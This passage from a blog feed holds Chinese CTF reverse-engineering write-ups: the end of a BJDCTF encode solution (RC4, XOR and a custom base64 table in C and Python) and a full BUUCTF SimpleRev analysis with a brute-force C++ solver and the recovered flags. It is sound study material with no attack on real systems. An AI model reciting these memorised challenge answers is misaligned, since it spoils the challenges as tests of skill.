<span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"HEX："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x "</span><span class="token punctuation">,</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//S-box</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Flag&#123;This_a_Flag&#125;\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>     <span class="token comment">//key</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> pData<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0xab</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//密文</span>    ULONG len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">rc4_init</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//已经完成了初始化</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//加密</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>pData<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"rc4 decrypt  : %s\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">base64_decode</span><span class="token punctuation">(</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decodekey <span class="token operator">=</span> <span class="token string">'Flag&#123;This_a_Flag&#125;'</span>decode_byte <span class="token operator">=</span> <span class="token string">'23152553081a5938126a3931275b0b1313085c330b356101511f105c'</span>encode_base64 <span class="token operator">=</span> <span class="token string">''</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>decode_byte<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lists<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>decode_byte<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lists<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encode_base64 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token string">'0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ='</span>table <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>table <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>t<span class="token punctuation">,</span> table<span class="token punctuation">)</span>flag <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>encode_base64<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>BJD{0v0_Y0u_g07_1T!}</p></blockquote><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><p>  <img src="https://s2.loli.net/2023/03/18/qSM4E2FKe8j19NX.png" alt="BJDCTF-encode8.png"></p><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><p><img src="https://s2.loli.net/2023/03/18/F812TzWLPCvfmsy.png" alt="BJDCTF-encode9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-SimpleRev</title>
      <link href="/2023/031b616ad0.html"/>
      <url>/2023/031b616ad0.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉<mark>大端序、小端序</mark></p></li><li><p>熟悉<em><strong>汇编中 str2 db 68h dup(?) 的写法</strong></em></p></li></ul><hr><p><a href="https://buuoj.cn/challenges#SimpleRev">BUUCTF-SimpleRev</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>拖入 IDA，直接查看 main() 函数<br><img src="https://s2.loli.net/2023/03/18/IFpGYioJuAHt6wy.png" alt="BUUCTF-SimpleRev1.png"><br> 逻辑很简单，输入 q&#x2F;Q，执行语句：<br> <code>(Decry)(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);</code></p></li><li><p>查看函数 <code>(Decry)</code><br><img src="https://s2.loli.net/2023/03/18/dDMfIYnXylCu561.png" alt="BUUCTF-SimpleRev2.png"></p></li><li><p>注意这里的 src、v9 均为小端存放<br>而且 <code>text = join(key3, v9)</code> 中传入的参数是 v9 的首地址，即 <code>v9[0]</code> 的值</p></li><li><p>将 <code>v9[0]</code> 两位一组，逆序输出为字符串：<br><code>v9[0] = 0x77 6F 64 61 68LL</code><br>即：0x68 0x61 0x64 0x6F 0x77，得到 “<strong>hadow</strong>“</p></li><li><p>将 <strong>src</strong> 两位一组，逆序输出为字符串：<br><code>*src = 0x53 4C 43 44 4ELL</code><br>即：0x4E 0x44 0x43 0x4C 0x53，得到 “<strong>NDCLS</strong>“</p></li><li><p>根据 <strong>key3</strong> 的值 “<strong>kills</strong>“<br><img src="https://s2.loli.net/2023/03/18/bAjzvf9KP2tosNW.png" alt="BUUCTF-SimpleRev3.png"></p></li><li><p>依据题意，得到拼接处理后的字符串<br><strong>text： killshadow<br>key: ADSFKNDCLS</strong></p></li><li><p>由于代码</p><pre class="language-c" data-language="c"><code class="language-c">v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span><span class="token operator">++</span>v3<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>只是一个初始化操作，并未涉及 flag 的值，直接跑一遍，发现该代码是将 key 由大写变成了小写<br>得到 <strong>key：adsfkndcls</strong></p></li><li><p>最后的循环采用正向爆破来解决<br>循环一次读取一个输入的字符，当该字符是大写字母或者小写字母时，就进行操作：</p><pre class="language-c" data-language="c"><code class="language-c">str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">++</span>v3<span class="token punctuation">;</span></code></pre><p>如果是空格就跳过，处理下一个，直到全部处理完，遇到 <code>&#39;\n&#39;</code>，循环结束<br>最后必须满足：text &#x3D;&#x3D; str2</p></li><li><p>这里关于 str2 的定义<br><img src="https://s2.loli.net/2023/03/18/oZsvm8d2BQWLVNK.png" alt="BUUCTF-SimpleRev4.png"><br><mark>语句 <code>str2 db 68h dup(?)</code> 是指开辟一个 68h 长度的空间，且不进行初始化</mark></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>string <span class="token function">little_endian</span><span class="token punctuation">(</span>__int64 num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">,</span> <span class="token keyword">int</span> width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    string buffer <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token operator">=</span>width_num<span class="token punctuation">;</span> index<span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">;</span> index<span class="token operator">-=</span>width_buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>width_buffer<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>width_buffer<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将width_buffer长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>width_buffer<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> width_buffer<span class="token punctuation">;</span>   <span class="token comment">// 因为前面修改了index，后面还要用index控制循环，所以这里将其还原</span>        buffer <span class="token operator">+=</span> sum<span class="token punctuation">;</span>  <span class="token comment">// 将字符sum逆向存储到 buffer字符串</span>        buffer_length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> buffer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    __int64 src <span class="token operator">=</span> <span class="token number">0x534C43444ELL</span><span class="token punctuation">;</span>    __int64 v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x776F646168LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">,</span> v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    string key3 <span class="token operator">=</span> <span class="token string">"kills"</span><span class="token punctuation">;</span>    string key1 <span class="token operator">=</span> <span class="token string">"ADSFK"</span><span class="token punctuation">;</span>    string s_v9<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> s_src<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token comment">// hadow   NDCLS</span>    s_v9 <span class="token operator">=</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s_src <span class="token operator">=</span> <span class="token function">little_endian</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    string text <span class="token operator">=</span> key3 <span class="token operator">+</span> s_v9<span class="token punctuation">;</span>    string key <span class="token operator">=</span> key1 <span class="token operator">+</span> s_src<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"text: "</span><span class="token operator">&lt;&lt;</span>text<span class="token operator">&lt;&lt;</span><span class="token string">"   "</span><span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token operator">&lt;&lt;</span>key<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">int</span> v5 <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token operator">&lt;&lt;</span>key<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> text<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">65</span> <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">97</span> <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token operator">++</span>v3<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>KLDQCUDFZO</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/MtgB1ZCnKSluOxP.png" alt="BUUCTF-SimpleRev5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME-easyasm</title>
      <link href="/2023/03ea927db8.html"/>
      <url>/2023/03ea927db8.html</url>
      
